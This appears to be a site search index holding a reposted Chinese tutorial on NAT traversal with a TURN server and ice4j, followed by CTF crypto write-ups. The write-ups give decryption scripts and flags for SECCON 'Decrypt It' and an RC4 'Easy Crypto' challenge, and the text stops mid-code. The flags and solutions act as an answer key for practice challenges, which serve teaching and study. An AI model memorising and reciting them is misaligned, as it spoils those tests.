\u7f16\u8bd1\u4e00\u4efd\uff0c\u5907\u7528\uff0c\u6211\u79f0\u5b83\u4e3aPeer1\u3002Pee1\u8fd0\u884c\u4e8e\u6211\u5bbf\u820d\u7684\u5de5\u4f5c\u7ad9\u4e0a\uff0c\u5916\u7f51IP\u548c\u670d\u52a1\u5668\u76f8\u540c\uff08\u4f4d\u4e8e\u540c\u4e00\u5c40\u57df\u7f51\uff09\uff0c\u90fd\u662f\uff1a \u7136\u540e\u5c06\u7528\u6237\u540d\u548c\u5bc6\u7801\u4fee\u6539\u4e3a\uff1a private String username = \"u2\"; private String password = \"p2\"; \u62f7\u8d1d\u5230\u53e6\u4e00\u53f0\u7535\u8111\u4e0a\u53bb\u4f5c\u4e3aPeer2\uff0c\u5176\u4e2dPeer2\u7684\u5916\u7f51IP\u4e3a\uff1a \u8fd9\u662f\u6821\u56ed\u7f51\u7684\u5916\u7f51IP\uff0c\u5168\u6821\u4e0a\u4e07\u53f0PC\u5206\u5e03\u5728\u5c42\u5c42\u8def\u7531\u548c\u9632\u706b\u5899\u4e4b\u4e0b\uff0c\u6211\u7684\u53e6\u4e00\u53f0PC\u4e5f\u662f\u5176\u4e2d\u4e00\u53f0\uff0c\u6211\u7684\u76ee\u6807\u5c31\u662f\u7a7f\u900f\u969c\u788d\uff0c\u8fbe\u5230\u5e7f\u57df\u7f51\u901a\u8baf\u7684\u76ee\u7684\u3002","title":"\u4fee\u6539\u914d\u7f6e\u9879"},{"location":"tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/#_7","text":"","title":"\u5f00\u59cb\u8bd5\u9a8c"},{"location":"tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/#_8","text":"Peer1\u548cPeer2\u8fd0\u884c\uff0c\u5206\u522b\u901a\u8fc7rfc5766-turn-server\u83b7\u53d6\u5230\u4e86\u81ea\u5df1\u7684SDP\u4fe1\u606f\uff08\u4fe1\u4ee4\uff09\uff1a","title":"\u83b7\u53d6\u4fe1\u4ee4"},{"location":"tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/#peer1","text":"v=0 o=ice4j.org 0 0 IN IP4 180.160.188.246 s=- t=0 0 a=ice-options:trickle a=ice-ufrag:2mu8s196cnbrvi a=ice-pwd:3rapigabe9fl3b1949nb1c9637 m=text 59229 RTP/AVP 0 c=IN 180.160.188.246 IP4 a=mid:text a=candidate:1 1 udp 2130706431 192.168.1.100 8888 typ host a=candidate:2 1 udp 2130706431 fe80:0:0:0:38f0:a64b:a7a6:e8b6 8888 typ host a=candidate:4 1 udp 2113937151 fe80:0:0:0:2891:b74a:6050:22b3 8888 typ host a=candidate:3 1 udp 2113932031 192.168.124.1 8888 typ host a=candidate:5 1 udp 1677724415 180.160.188.246 11252 typ srflx raddr 192.168.1.100 rport 8888 a=candidate:6 1 udp 2815 180.160.188.246 59229 typ relay raddr 180.160.188.246 rport 11252","title":"Peer1\u2014\u2014"},{"location":"tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/#peer2","text":"v=0 o=ice4j.org 0 0 IN IP4 180.160.188.246 s=- t=0 0 a=ice-options:trickle a=ice-ufrag:8q3b1196cnip55 a=ice-pwd:7ua73q9prlqn1jbal7143fprsd m=text 52430 RTP/AVP 0 c=IN 180.160.188.246 IP4 a=mid:text a=candidate:1 1 udp 2130706431 10.2.203.96 6666 typ host a=candidate:2 1 udp 2130706431 fe80:0:0:0:448b:e2e1:7f4b:f0b8 6666 typ host a=candidate:3 1 udp 1677724415 58.32.217.55 6666 typ srflx raddr 10.2.203.96 rport 6666 a=candidate:4 1 udp 2815 180.160.188.246 52430 typ relay raddr 58.32.217.55 rport 6666 \u540c\u65f6\u53ef\u4ee5\u5728rfc5766-turn-server\u7684\u7ec8\u7aef\u770b\u5230\u8f93\u51fa\uff1a 7: handle_udp_packet: New UDP endpoint: local addr 192.168.1.103:3478, remote addr 180.160.188.246:10898 7: session 000000000000000001: user <>: incoming packet BINDING processed, success 7: session 000000000000000001: user <>: incoming packet message processed, error 401: Unauthorised 7: IPv4. Local relay addr: 192.168.1.103:54837 7: session 000000000000000001: new, username=<u1>, lifetime=600 7: session 000000000000000001: user <u1>: incoming packet ALLOCATE processed, success","title":"Peer2\u2014\u2014"},{"location":"tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/#_9","text":"\u7531\u4e8e\u6211\u8fd8\u6ca1\u6709\u5b9e\u73b0\u81ea\u5df1\u7684\u4fe1\u4ee4\u670d\u52a1\u5668\uff08SIP\uff09\uff0c\u6240\u4ee5\u901a\u8fc7\u7c7b\u4f3c\u7535\u5b50\u90ae\u4ef6\u590d\u5236\u7c98\u8d34\u7684\u65b9\u5f0f\u4ea4\u6362\u4e86\u4e24\u8005\u7684\u4fe1\u4ee4\u3002 \u4ea4\u6362\u540e\uff0c\u4e24\u4e2aPeer\u5f00\u59cb\u914d\u5bf9\uff0c\u914d\u5bf9\u8fc7\u7a0b\u7684\u8f93\u51fa\u8bf7\u53c2\u8003\u200d \u200d\u4ea4\u6362\u4fe1\u606f\u914d\u200d\u5bf9 \uff0c\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u3002\u200d","title":"\u4ea4\u6362\u4fe1\u4ee4"},{"location":"tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/#_10","text":"\u4e4b\u540e\u4e24\u8005\u5c31\u53ef\u4ee5\u804a\u5929\u4e86\uff1a","title":"\u804a\u5929"},{"location":"tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/#peer1_1","text":"/192.168.1.103:52430 says: hello, i am from hello i get it,hi /192.168.1.103:52430 says: \u8bd5\u8bd5\u4e2d\u6587 \u6ca1\u95ee\u9898 /192.168.1.103:52430 says: \u6211\u5728\u6821\u56ed\u7f51\uff0c\u4f3c\u4e4e\u4e0d\u80fd\u8d70p2p\uff0c\u5e78\u4e8f\u6709turn\u670d\u52a1\u5668 \u5bf9\uff0c\u4f60\u7684ip\u662fturn\u670d\u52a1\u5668\u7684ip\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u8fd9\u6761\u6d88\u606f\u662f\u4eceturn\u670d\u52a1\u5668\u90a3\u91cc\u83b7\u53d6\u7684 /192.168.1.103:52430 says: \u597d\u5427\uff0c\u8fd9\u6837\u4e5f\u7b97\u5e7f\u57df\u7f51\u901a\u8baf\u6210\u529f\u4e86 \u884c\uff0c\u5c31\u8fd9\u6837\uff0c\u518d\u89c1 /192.168.1.103:52430 says: bye","title":"Peer1"},{"location":"tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/#peer2_1","text":"hello, i am from hello /192.168.1.100:8888 says: i get it,hi \u8bd5\u8bd5\u4e2d\u6587 /192.168.1.100:8888 says: \u6ca1\u95ee\u9898 \u6211\u5728\u6821\u56ed\u7f51\uff0c\u4f3c\u4e4e\u4e0d\u80fd\u8d70p2p\uff0c\u5e78\u4e8f\u6709turn\u670d\u52a1\u5668 /192.168.1.100:8888 says: \u5bf9\uff0c\u4f60\u7684ip\u662fturn\u670d\u52a1\u5668\u7684ip\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u8fd9\u6761\u6d88\u606f\u662f\u4eceturn\u670d\u52a1\u5668\u90a3\u91cc\u83b7\u53d6\u7684 \u597d\u5427\uff0c\u8fd9\u6837\u4e5f\u7b97\u5e7f\u57df\u7f51\u901a\u8baf\u6210\u529f\u4e86 /192.168.1.100:8888 says: \u884c\uff0c\u5c31\u8fd9\u6837\uff0c\u518d\u89c1 bye \u53ef\u4ee5\u770b\u5230\u867d\u7136\u4e24\u8005\u5904\u4e8e\u4e0d\u540c\u7684\u5c40\u57df\u7f51\uff0c\u62e5\u6709\u4e0d\u540c\u7684\u5916\u7f51IP\uff0c\u4f46\u662f\u7531\u4e8ePeer1\uff08192.168.1.100\uff09\u4e0e\u670d\u52a1\u5668\uff08192.168.1.103\uff09\u5904\u4e8e\u540c\u4e00\u5c40\u57df\u7f51\uff0c\u6240\u4ee5Peer1\u4e00\u76f4\u5728\u7528\u5c40\u57df\u7f51\u548crfc5766-turn-server\u901a\u8baf\u3002 \u800cPeer2\u4e0ePeer1\u76f4\u8fde\u5931\u8d25\uff0c\u901a\u8fc7turn\u670d\u52a1\u5668\u4e2d\u8f6c\u6570\u636e\uff0c\u6240\u4ee5\u5728Peer1\u770b\u6765\uff0cPeer2\u7684IP\u662f192.168.1.103\uff0c\u4e0eturn\u670d\u52a1\u5668\u4e00\u6478\u4e00\u6837\u3002 \u9898\u5916\u8bdd\uff0c\u6211\u662f\u6709\u591a\u5bc2\u5bde\u624d\u80fd\u8ddf\u81ea\u5df1\u804a\u7684\u90a3\u4e48\u5f00\u5fc3\u7684\uff1f","title":"Peer2"},{"location":"tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/#reference","text":"http://blog.wnotes.net/blog/article/stun-server-on-aws-ec2 https://code.google.com/p/rfc5766-turn-server/wiki/turnserver \u539f\u6587\u94fe\u63a5\uff1a http://www.hankcs.com/program/network/actual-rfc5766-turn-server-and-ice4j-wide-area-network-communication.html","title":"Reference"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/Crypto_Decrypt-It-easy/","text":"1 \u9898\u76ee \u9898\u76ee\u63cf\u8ff0: \u627e\u5230\u5b57\u7b26\u4e32\u5728\u968f\u673a\u5316\u4e4b\u524d. \u9898\u76ee\u9644\u4ef6: \u4e0b\u8f7d\u9644\u4ef6 $ unzip 25a3b5ca44524966bc029b262028e345.zip Archive: 25a3b5ca44524966bc029b262028e345.zip inflating: ecrypt1.bin inflating: rnd inflating: readme.txt $ cat readme.txt $ ./rnd crypt1.png ecrypt1.bin $ file rnd rnd: ELF 32 -bit LSB executable, Intel 80386 , version 1 ( SYSV ) , dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2 .6.24, BuildID [ sha1 ]= 6a1443272dd530117d3c63884e195120a845c499, stripped \u4ece\u4e0a\u6587\u53ef\u77e5\uff0c\u52a0\u5bc6\u6587\u4ef6 ecrypt1.bin \u7531\u56fe\u7247 crypt1.png \u7ecf\u53ef\u6267\u884c\u7a0b\u5e8f rnd \u52a0\u5bc6\u751f\u6210 2 \u53ef\u6267\u884c\u7a0b\u5e8f rnd \u7528 Ghidra \u6253\u5f00\uff1a void entry ( void ) { __libc_start_main ( FUN_08048514 ); do { /* WARNING: Do nothing block with infinite loop */ } while ( true ); } undefined4 FUN_08048514 ( int param_1 , int param_2 ) { undefined4 uVar1 ; uint __seed ; FILE * __stream ; FILE * __stream_00 ; size_t sVar2 ; int iVar3 ; byte local_11 [ 13 ]; if ( param_1 < 3 ) { uVar1 = 1 ; } else { __seed = time (( time_t * ) 0x0 ); srand ( __seed ); __stream = fopen ( * ( char ** )( param_2 + 4 ), \"rb\" ); __stream_00 = fopen ( * ( char ** )( param_2 + 8 ), \"wb\" ); while ( true ) { sVar2 = fread ( local_11 , 1 , 1 , __stream ); if ( sVar2 != 1 ) break ; iVar3 = rand (); local_11 [ 0 ] = local_11 [ 0 ] ^ ( byte ) iVar3 ; fwrite ( local_11 , 1 , 1 , __stream_00 ); } fclose ( __stream ); fclose ( __stream_00 ); uVar1 = 0 ; } return uVar1 ; } \u51fd\u6570 FUN_08048514 \u6253\u5f00\u4e24\u4e2a\u6587\u4ef6\uff0c__stream\uff0c__stream_00\uff0c\u4ece__stream\u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\uff0c\u4e0e\u968f\u673a\u6570 iVar3 \u5f02\u6216\u540e\u5199\u5165__stream_00 \u5176\u4e2d\u968f\u673a\u6570\u4f7f\u7528\u79cd\u5b50 __seed = time((time_t *)0x0) https://blogs.univ-poitiers.fr/e-laize/2014/12/08/seccon-2014-quals-crypto-decrypt-it/ $ stat ecrypt1.bin File: \u00ab ecrypt1.bin \u00bb Size: 45989 Blocks: 96 IO Block: 4096 fichier Device: 801h/2049d Inode: 49544 Links: 1 Access: (0664/-rw-rw-r--) Uid: ( 1000/ phoenix) Gid: ( 1000/ phoenix) Access: 2014-11-22 15:46:36.000000000 +0100 Modify: 2014-11-22 15:46:30.000000000 +0100 Change: 2014-12-07 00:53:58.000000000 +0100 $ stat --printf=%Y ecrypt1.bin 1416667590 3 exp #include <iostream> #include <cstdlib> #include <time.h> using namespace std ; int main () { FILE * __stream ; FILE * __stream_00 ; int sVar2 ; int local_11 [ 11 ]; int iVar3 ; // https://blogs.univ-poitiers.fr/e-laize/2014/12/08/seccon-2014-quals-crypto-decrypt-it/ //srand(time(NULL)); srand ( 1416667590 ); __stream = fopen ( \"ecrypt1.bin\" , \"rb\" ); __stream_00 = fopen ( \"crypt1.png\" , \"wb\" ); while ( 1 ) { sVar2 = fread ( local_11 , 1 , 1 , __stream ); if ( sVar2 != 1 ) break ; iVar3 = rand (); //local_11[0] = local_11[0] ^ (iVar3 & 0xff); //local_11[0] = local_11[0] ^ iVar3; local_11 [ 0 ] = local_11 [ 0 ] ^ ( iVar3 & 0xff ); fwrite ( local_11 , 1 , 1 , __stream_00 ); } fclose ( __stream ); fclose ( __stream_00 ); return 0 ; } \u5982\u679c\u60f3\u7f16\u51fa32\u4f4d\u7684\u7a0b\u5e8f\uff0c\u9700\u8981\u5b89\u88c5\u4e1c\u897f\u3002 $ sudo apt-get install build-essential module-assistant $ sudo apt-get install gcc-multilib g++-multilib g++ -m32 exp.cpp 4 png \u56fe\u7247\u5185\u5bb9\u5982\u4e0b\uff1a N = pq C = M ( M + B ) mod N N = B8AE199365 B = FFEEE C = 8 D5051562B N = B86E78C811 B = FFFEE C = 5 FFA0AC1A2 N = 7 BD4071E55 B = FEFEF C = 6008 DDF867 ~~\u7206\u7834\uff1a~~ data = [( 0xB8AE199365 , 0xFFEEE , 0x8D5051562B ), ( 0xB86E78C811 , 0xFFFEE , 0x5FFA0AC1A2 ), ( 0x7BD4071E55 , 0xFEFEF , 0x6008DDF867 )] R = [] cnt = 1 for ( N , B , C ) in data : print ( cnt ) cnt = cnt + 1 for M in range ( N ): if C == M * ( M + B ) % N : print ( \"M = \" , M ) R . append ( M ) \u4ece http://factordb.com/ \u5206\u89e3N\u5f97\uff1a 0xB8AE199365 = 868019 \u00b7 913799 0xB86E78C811 = 875543 \u00b7 904727 0X7BD4071E55 = 597263 \u00b7 890459 \u7206\u7834\uff1a data = [( 868019 , 913799 , 0xFFEEE , 0x8D5051562B ), ( 875543 , 904727 , 0xFFFEE , 0x5FFA0AC1A2 ), ( 597263 , 890459 , 0xFEFEF , 0x6008DDF867 )] R = [] cnt = 1 for ( p , q , B , C ) in data : print ( cnt ) cnt = cnt + 1 for M in range ( p ): if C % p == ( M * ( M + B )) % p : print ( \"M % p = \" , M , \"%\" , p ) R . append ( M ) for M in range ( q ): if C % q == ( M * ( M + B )) % q : print ( \"M % q = \" , M , \"%\" , q ) R . append ( M ) \u8f93\u51fa\uff1a 1 M % p = 158558 % 868019 M % p = 529178 % 868019 M % q = 24100 % 913799 M % q = 755196 % 913799 2 M % p = 270422 % 875543 M % p = 432106 % 875543 M % q = 263205 % 904727 M % q = 497691 % 904727 3 M % p = 194177 % 597263 M % p = 553149 % 597263 M % q = 351135 % 890459 M % q = 385320 % 890459 5 \u4e2d\u56fd\u5269\u4f59\u5b9a\u7406 \u4ece\u4e0a\u9762\u770b\uff0c\u6ca1\u4e2a\u89e3\u90fd\u6709\u4e24\u4e2a\u60c5\u51b5\uff0c\u7ec4\u5408\u5728\u4e00\u8d77\u662f\u56db\u4e2a\u7b54\u6848\uff1a from sympy.ntheory.modular import crt from Crypto.Util.number import long_to_bytes M = [[( 158558 , 529178 ), ( 24100 , 755196 )], [( 270422 , 432106 ), ( 263205 , 497691 )], [( 194177 , 553149 ), ( 351135 , 385320 )] ] V = [[ 868019 , 913799 ], [ 875543 , 904727 ], [ 597263 , 890459 ]] cnt = 0 for i in range ( 3 ): print ( i ) mp , mq = M [ i ] vx = V [ i ] #for mi,mj in zip(mp,mq): for mi in mp : for mj in mq : mx = [ mi , mj ] crt_m_v = crt ( vx , mx ) print ( crt_m_v ) if crt_m_v : print ( long_to_bytes ( crt_m_v [ 0 ])) \u8f93\u51fa 0 (mpz(435549524264), 793194894181) b'eh\\xc6Q(' (mpz(417932210640), 793194894181) b'aN\\xb3q\\xd0' (mpz(375261635239), 793194894181) b'W_V\"\\xa7' (mpz(357644321615), 793194894181) b'SECCO' 1 (mpz(576969098734), 792127391761) b'\\x86V\\t\\xc5\\xee' (mpz(337076445535), 792127391761) b'N{Ra_' (mpz(455049897668), 792127391761) b'i\\xf3\\x16f\\xc4' (mpz(215157244469), 792127391761) b'2\\x18_\\x025' 2 (mpz(110102044649), 531838213717) b'\\x19\\xa2\\x97\\xdf\\xe9' (mpz(368810693940), 531838213717) b'U\\xde\\xd4\\x954' (mpz(163026475314), 531838213717) b'%\\xf5\"\\x992' (mpz(421735124605), 531838213717) b'b1_N}' 6 flag SECCON{Ra_b1_N}","title":"Crypto Decrypt It easy"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/Crypto_Decrypt-It-easy/#1","text":"\u9898\u76ee\u63cf\u8ff0: \u627e\u5230\u5b57\u7b26\u4e32\u5728\u968f\u673a\u5316\u4e4b\u524d. \u9898\u76ee\u9644\u4ef6: \u4e0b\u8f7d\u9644\u4ef6 $ unzip 25a3b5ca44524966bc029b262028e345.zip Archive: 25a3b5ca44524966bc029b262028e345.zip inflating: ecrypt1.bin inflating: rnd inflating: readme.txt $ cat readme.txt $ ./rnd crypt1.png ecrypt1.bin $ file rnd rnd: ELF 32 -bit LSB executable, Intel 80386 , version 1 ( SYSV ) , dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2 .6.24, BuildID [ sha1 ]= 6a1443272dd530117d3c63884e195120a845c499, stripped \u4ece\u4e0a\u6587\u53ef\u77e5\uff0c\u52a0\u5bc6\u6587\u4ef6 ecrypt1.bin \u7531\u56fe\u7247 crypt1.png \u7ecf\u53ef\u6267\u884c\u7a0b\u5e8f rnd \u52a0\u5bc6\u751f\u6210","title":"1 \u9898\u76ee"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/Crypto_Decrypt-It-easy/#2-rnd","text":"\u7528 Ghidra \u6253\u5f00\uff1a void entry ( void ) { __libc_start_main ( FUN_08048514 ); do { /* WARNING: Do nothing block with infinite loop */ } while ( true ); } undefined4 FUN_08048514 ( int param_1 , int param_2 ) { undefined4 uVar1 ; uint __seed ; FILE * __stream ; FILE * __stream_00 ; size_t sVar2 ; int iVar3 ; byte local_11 [ 13 ]; if ( param_1 < 3 ) { uVar1 = 1 ; } else { __seed = time (( time_t * ) 0x0 ); srand ( __seed ); __stream = fopen ( * ( char ** )( param_2 + 4 ), \"rb\" ); __stream_00 = fopen ( * ( char ** )( param_2 + 8 ), \"wb\" ); while ( true ) { sVar2 = fread ( local_11 , 1 , 1 , __stream ); if ( sVar2 != 1 ) break ; iVar3 = rand (); local_11 [ 0 ] = local_11 [ 0 ] ^ ( byte ) iVar3 ; fwrite ( local_11 , 1 , 1 , __stream_00 ); } fclose ( __stream ); fclose ( __stream_00 ); uVar1 = 0 ; } return uVar1 ; } \u51fd\u6570 FUN_08048514 \u6253\u5f00\u4e24\u4e2a\u6587\u4ef6\uff0c__stream\uff0c__stream_00\uff0c\u4ece__stream\u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\uff0c\u4e0e\u968f\u673a\u6570 iVar3 \u5f02\u6216\u540e\u5199\u5165__stream_00 \u5176\u4e2d\u968f\u673a\u6570\u4f7f\u7528\u79cd\u5b50 __seed = time((time_t *)0x0) https://blogs.univ-poitiers.fr/e-laize/2014/12/08/seccon-2014-quals-crypto-decrypt-it/ $ stat ecrypt1.bin File: \u00ab ecrypt1.bin \u00bb Size: 45989 Blocks: 96 IO Block: 4096 fichier Device: 801h/2049d Inode: 49544 Links: 1 Access: (0664/-rw-rw-r--) Uid: ( 1000/ phoenix) Gid: ( 1000/ phoenix) Access: 2014-11-22 15:46:36.000000000 +0100 Modify: 2014-11-22 15:46:30.000000000 +0100 Change: 2014-12-07 00:53:58.000000000 +0100 $ stat --printf=%Y ecrypt1.bin 1416667590","title":"2 \u53ef\u6267\u884c\u7a0b\u5e8frnd"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/Crypto_Decrypt-It-easy/#3-exp","text":"#include <iostream> #include <cstdlib> #include <time.h> using namespace std ; int main () { FILE * __stream ; FILE * __stream_00 ; int sVar2 ; int local_11 [ 11 ]; int iVar3 ; // https://blogs.univ-poitiers.fr/e-laize/2014/12/08/seccon-2014-quals-crypto-decrypt-it/ //srand(time(NULL)); srand ( 1416667590 ); __stream = fopen ( \"ecrypt1.bin\" , \"rb\" ); __stream_00 = fopen ( \"crypt1.png\" , \"wb\" ); while ( 1 ) { sVar2 = fread ( local_11 , 1 , 1 , __stream ); if ( sVar2 != 1 ) break ; iVar3 = rand (); //local_11[0] = local_11[0] ^ (iVar3 & 0xff); //local_11[0] = local_11[0] ^ iVar3; local_11 [ 0 ] = local_11 [ 0 ] ^ ( iVar3 & 0xff ); fwrite ( local_11 , 1 , 1 , __stream_00 ); } fclose ( __stream ); fclose ( __stream_00 ); return 0 ; } \u5982\u679c\u60f3\u7f16\u51fa32\u4f4d\u7684\u7a0b\u5e8f\uff0c\u9700\u8981\u5b89\u88c5\u4e1c\u897f\u3002 $ sudo apt-get install build-essential module-assistant $ sudo apt-get install gcc-multilib g++-multilib g++ -m32 exp.cpp","title":"3 exp"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/Crypto_Decrypt-It-easy/#4-png","text":"\u56fe\u7247\u5185\u5bb9\u5982\u4e0b\uff1a N = pq C = M ( M + B ) mod N N = B8AE199365 B = FFEEE C = 8 D5051562B N = B86E78C811 B = FFFEE C = 5 FFA0AC1A2 N = 7 BD4071E55 B = FEFEF C = 6008 DDF867 ~~\u7206\u7834\uff1a~~ data = [( 0xB8AE199365 , 0xFFEEE , 0x8D5051562B ), ( 0xB86E78C811 , 0xFFFEE , 0x5FFA0AC1A2 ), ( 0x7BD4071E55 , 0xFEFEF , 0x6008DDF867 )] R = [] cnt = 1 for ( N , B , C ) in data : print ( cnt ) cnt = cnt + 1 for M in range ( N ): if C == M * ( M + B ) % N : print ( \"M = \" , M ) R . append ( M ) \u4ece http://factordb.com/ \u5206\u89e3N\u5f97\uff1a 0xB8AE199365 = 868019 \u00b7 913799 0xB86E78C811 = 875543 \u00b7 904727 0X7BD4071E55 = 597263 \u00b7 890459 \u7206\u7834\uff1a data = [( 868019 , 913799 , 0xFFEEE , 0x8D5051562B ), ( 875543 , 904727 , 0xFFFEE , 0x5FFA0AC1A2 ), ( 597263 , 890459 , 0xFEFEF , 0x6008DDF867 )] R = [] cnt = 1 for ( p , q , B , C ) in data : print ( cnt ) cnt = cnt + 1 for M in range ( p ): if C % p == ( M * ( M + B )) % p : print ( \"M % p = \" , M , \"%\" , p ) R . append ( M ) for M in range ( q ): if C % q == ( M * ( M + B )) % q : print ( \"M % q = \" , M , \"%\" , q ) R . append ( M ) \u8f93\u51fa\uff1a 1 M % p = 158558 % 868019 M % p = 529178 % 868019 M % q = 24100 % 913799 M % q = 755196 % 913799 2 M % p = 270422 % 875543 M % p = 432106 % 875543 M % q = 263205 % 904727 M % q = 497691 % 904727 3 M % p = 194177 % 597263 M % p = 553149 % 597263 M % q = 351135 % 890459 M % q = 385320 % 890459","title":"4 png"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/Crypto_Decrypt-It-easy/#5","text":"\u4ece\u4e0a\u9762\u770b\uff0c\u6ca1\u4e2a\u89e3\u90fd\u6709\u4e24\u4e2a\u60c5\u51b5\uff0c\u7ec4\u5408\u5728\u4e00\u8d77\u662f\u56db\u4e2a\u7b54\u6848\uff1a from sympy.ntheory.modular import crt from Crypto.Util.number import long_to_bytes M = [[( 158558 , 529178 ), ( 24100 , 755196 )], [( 270422 , 432106 ), ( 263205 , 497691 )], [( 194177 , 553149 ), ( 351135 , 385320 )] ] V = [[ 868019 , 913799 ], [ 875543 , 904727 ], [ 597263 , 890459 ]] cnt = 0 for i in range ( 3 ): print ( i ) mp , mq = M [ i ] vx = V [ i ] #for mi,mj in zip(mp,mq): for mi in mp : for mj in mq : mx = [ mi , mj ] crt_m_v = crt ( vx , mx ) print ( crt_m_v ) if crt_m_v : print ( long_to_bytes ( crt_m_v [ 0 ])) \u8f93\u51fa 0 (mpz(435549524264), 793194894181) b'eh\\xc6Q(' (mpz(417932210640), 793194894181) b'aN\\xb3q\\xd0' (mpz(375261635239), 793194894181) b'W_V\"\\xa7' (mpz(357644321615), 793194894181) b'SECCO' 1 (mpz(576969098734), 792127391761) b'\\x86V\\t\\xc5\\xee' (mpz(337076445535), 792127391761) b'N{Ra_' (mpz(455049897668), 792127391761) b'i\\xf3\\x16f\\xc4' (mpz(215157244469), 792127391761) b'2\\x18_\\x025' 2 (mpz(110102044649), 531838213717) b'\\x19\\xa2\\x97\\xdf\\xe9' (mpz(368810693940), 531838213717) b'U\\xde\\xd4\\x954' (mpz(163026475314), 531838213717) b'%\\xf5\"\\x992' (mpz(421735124605), 531838213717) b'b1_N}'","title":"5 \u4e2d\u56fd\u5269\u4f59\u5b9a\u7406"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/Crypto_Decrypt-It-easy/#6-flag","text":"SECCON{Ra_b1_N}","title":"6 flag"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/Crypto_Easy_Crypto/","text":"1 \u9898\u76ee get buf unsign s [ 256 ] get buf t [ 256 ] we have key : hello world we have flag : ???????????????????????????????? for i : 0 to 256 set s [ i ]: i for i : 0 to 256 set t [ i ]: key [( i ) mod ( key . lenth )] for i : 0 to 256 set j :( j + s [ i ] + t [ i ]) mod ( 256 ) swap : s [ i ], s [ j ] for m : 0 to 37 set i :( i + 1 ) mod ( 256 ) set j :( j + S [ i ]) mod ( 256 ) swap : s [ i ], s [ j ] set x :( s [ i ] + ( s [ j ] mod ( 256 )) mod ( 256 )) set flag [ m ]: flag [ m ] ^ s [ x ] fprint flagx to file \u6839\u636e\u9898\u76ee\uff1a\u539f\u59cb flag[m] \u4e0e s[x] \u5f02\u6216\u540e\u5b58\u5165\u6587\u4ef6\uff0c\u6240\u4ee5\u53ef\u4ee5 \u6587\u4ef6\u7ed3\u679c \u5f02\u6216 s[x] \u5f97\u5230flag\uff0c\u4e14\u6309\u987a\u5e8f\u5b9e\u73b0\u53ef\u4ee5\u5f97\u5230s[x] 2 exp f = open ( \"enc.txt\" , \"rb\" ) data = f . read () f . close () key = \"hello world\" s = [] t = [] for i in range ( 256 ): s . append ( i ) c = key [ i % ( len ( key ))] t . append ( ord ( c )) j = 0 for i in range ( 256 ): j = ( j + s [ i ] + t [ i ]) % 256 s [ i ], s [ j ] = s [ j ], s [ i ] i = 0 j = 0 flag = [] for m in range ( 37 ): i = ( i + 1 ) % 256 j = ( j + s [ i ]) % 256 s [ i ], s [ j ] = s [ j ], s [ i ] x = ( s [ i ] + s [ j ]) % 256 flag . append ( data [ m ] ^ s [ x ]) print ( bytes ( flag )) # EIS{55a0a84f86a6ad40006f014619577ad3}","title":"Crypto Easy Crypto"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/Crypto_Easy_Crypto/#1","text":"get buf unsign s [ 256 ] get buf t [ 256 ] we have key : hello world we have flag : ???????????????????????????????? for i : 0 to 256 set s [ i ]: i for i : 0 to 256 set t [ i ]: key [( i ) mod ( key . lenth )] for i : 0 to 256 set j :( j + s [ i ] + t [ i ]) mod ( 256 ) swap : s [ i ], s [ j ] for m : 0 to 37 set i :( i + 1 ) mod ( 256 ) set j :( j + S [ i ]) mod ( 256 ) swap : s [ i ], s [ j ] set x :( s [ i ] + ( s [ j ] mod ( 256 )) mod ( 256 )) set flag [ m ]: flag [ m ] ^ s [ x ] fprint flagx to file \u6839\u636e\u9898\u76ee\uff1a\u539f\u59cb flag[m] \u4e0e s[x] \u5f02\u6216\u540e\u5b58\u5165\u6587\u4ef6\uff0c\u6240\u4ee5\u53ef\u4ee5 \u6587\u4ef6\u7ed3\u679c \u5f02\u6216 s[x] \u5f97\u5230flag\uff0c\u4e14\u6309\u987a\u5e8f\u5b9e\u73b0\u53ef\u4ee5\u5f97\u5230s[x]","title":"1 \u9898\u76ee"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/Crypto_Easy_Crypto/#2-exp","text":"f = open ( \"enc.txt\" , \"rb\" ) data = f . read () f . close () key = \"hello world\" s = [] t = [] for i in range ( 256 ): s . append ( i ) c = key [ i % ( len ( 